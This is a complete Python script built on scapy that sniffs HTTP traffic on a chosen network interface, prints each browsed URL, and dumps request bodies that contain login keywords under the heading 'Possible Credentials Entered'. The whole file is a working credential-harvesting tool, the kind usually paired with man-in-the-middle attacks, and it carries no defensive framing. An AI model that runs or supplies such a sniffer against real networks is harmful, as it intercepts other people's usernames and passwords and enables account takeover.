#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface to be Sniffed")
    (values, options) = parser.parse_args()
    if not values.interface:
        parser.error("[-] Please Specify a Sniffer Interface, Use --help for more info")
    return values


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        login_keywords = ["user", "pwd", "usr", "UserName", "User", "Login", "Email", "Password", "Pass", "Secret",
                          "Username"]

        for keyword in login_keywords:
            if bytes(keyword, encoding='utf-8') in load:
                return load


def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("\n[+] Browsed URL: " + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n\n\t[+] Possible Credentials Entered:  " + str(login_info) + "\n\n\n")


get_interface = get_arguments()
sniff(get_interface.interface)
